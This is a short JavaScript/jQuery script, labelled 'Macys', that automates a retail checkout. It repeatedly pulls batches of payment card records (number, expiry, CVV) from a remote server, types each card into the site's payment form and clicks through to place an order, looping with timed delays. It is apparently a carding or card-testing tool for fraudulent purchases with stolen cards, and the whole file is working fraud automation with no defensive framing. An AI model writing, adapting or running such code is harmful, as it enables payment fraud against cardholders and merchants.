var postUrl = "https://" + baseUrl + "/post";
var fakeUrl = "https://" + baseUrl + "/fake?city=Miami";
var iteration = null;
var options = {
     url:postUrl,
     dataType: "jsonp"
};
var cards = function(arr) {
	var i = 0;
	var len = arr.length;
        var segundos = 5;

	var iteration = function() {
	  if( i < len ) {
	    var json = arr[i];

            $("#rc-payment-edit").click();
            setTimeout( function() {
              $("#rc-payment-card-type").val( json.card[0] == "4" ? "V" : "M" );
              $("#rc-payment-card-number").val(json.card);
              if( !$("#rc-payment-card-month")[0] )  iteration();
              $("#rc-payment-card-month")[0].options[ json.mon-1 ].selected = true;
              $("#rc-payment-card-year")[0].options[ json.year-16 ].selected = true;
              $("#rc-payment-scode").val(json.cvv);
              $("#rc-payment-continue").click();
              setTimeout(function() {
                $("#rc-place-order").click();
                setTimeout(function() {
                  iteration();
                }, 5000);
              }, 5000);
            }, 2000);
	  }
	  else {
	    $.ajax(options)
      .success(cards);
	  }

	  i++;
	}

	iteration();
};
// Macys
$.ajax(options)
.success(cards);
